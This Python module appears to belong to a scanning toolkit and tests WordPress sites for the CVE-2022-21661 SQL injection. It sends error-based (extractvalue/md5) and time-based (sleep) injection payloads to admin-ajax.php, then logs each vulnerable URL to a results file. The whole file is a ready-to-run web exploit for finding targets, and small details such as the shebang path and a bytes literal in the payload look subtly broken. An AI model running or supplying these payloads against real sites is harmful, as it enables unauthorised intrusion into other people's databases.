#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests, hashlib, random,urllib3
from libs.public.outprint import OutPrintInfo
urllib3.disable_warnings()

class Cve_2022_21661:
    def main(self,target):
        url=target[0].strip("/ ")
        headers = target[1]
        proxy = target[2]
        ssl = target[3]
        timeout = int(target[4])
        # OutPrintInfo('WordPress','Attempting to locate CVE-2022-21661...')
        try:
            r0 = requests.get(f'{url}/wp-admin/admin-ajax.php', headers={"User-Agent": headers},proxies=proxy,timeout=timeout,verify=ssl)
            if r0.status_code == 400 and '0' in r0.text:
                randNum = str(random.randint(1234567890987654321,9999999999999999999)).encode('utf-8')
                data='{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) and extractvalue(rand(),concat(0x5e,md5(' + str(randNum) + '),0x5e))#"]}}}'
                r1 = requests.post(f'{url}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": headers},proxies=proxy,timeout=timeout,verify=ssl)
                if r1.status_code == 200 and str(hashlib.md5(randNum).hexdigest()) in r1.text:
                    OutPrintInfo('WordPress',f'[b bright_red]Vulnerable URL: {url} ')
                    with open("./result/wordpressSql.txt", "a") as w:
                        w.write(f"{url}\n")
                else:
                    # OutPrintInfo('WordPress','Failed on MD5, testing time based query...')
                    data = '{"tax_query":{"0":{"field":"term_taxonomy_id","terms":["111) or (select sleep(5))#"]}}}'
                    r2 = requests.post(f'{url}/wp-admin/admin-ajax.php', data={"action":"test","data":data}, headers={"User-Agent": headers},proxies=proxy,timeout=timeout,verify=ssl)
                    if r2.elapsed.total_seconds() >= 5 and r2.status_code == 200:
                        OutPrintInfo('WordPress', f'[b bright_red]Vulnerable URL: {url} ')
                        with open("./result/wordpressSql.txt", "a") as w:
                            w.write(f"{url}\n")
                        # OutPrintInfo('WordPress','Vulnerable!')
                    else:
                        pass
                        # OutPrintInfo('WordPress','Not Vulnerable! (Failed after checking for CVE using 2 PoC\'s)')
            else:
                pass
                # OutPrintInfo('WordPress','Not Vulnerable! (Failed at admin-ajax check)')

        except Exception:
            pass